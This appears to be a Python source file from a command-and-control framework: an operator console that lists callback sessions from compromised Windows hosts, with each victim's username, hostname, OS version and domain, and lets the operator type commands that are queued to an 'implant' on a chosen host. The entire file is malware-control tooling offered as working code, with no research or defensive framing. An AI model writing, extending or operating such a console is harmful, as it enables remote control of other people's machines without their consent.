# interact.py
import json
import os
import random
import time
import threading
import server
import sqlite3

_lock = threading.Lock()

def gen_callback_id():
    return "{:06d}".format(random.randint(0, 999999))

def list_callbacks():
    with server.sessions_lock:
        out = []
        for sid, info in server.sessions.items():
            out.append((sid, info["username"], info["hostname"], info["windows_ver"], info["domain"], info["created_at"]))
    return out

def interact(session_id, timeout=2):
    with server.sessions_lock:
        s = server.sessions.get(session_id)
        if not s:
            print("session not found")
            return False
    print(f"[interact {session_id}] start. type 'exit' to quit.")
    try:
        while True:
            cmd = input(f"{session_id} >> ").strip()
            if not cmd:
                continue
            if cmd.lower() in ("exit", "quit"):
                break
            if cmd.lower() == "help":
                print("type command to queue to implant; 'exit' to quit")
                continue
            server.enqueue_command_for_session(session_id, cmd)
            print(f"[interact {session_id}] queued -> {cmd}")
            time.sleep(timeout)
    except KeyboardInterrupt:
        print()
    return True
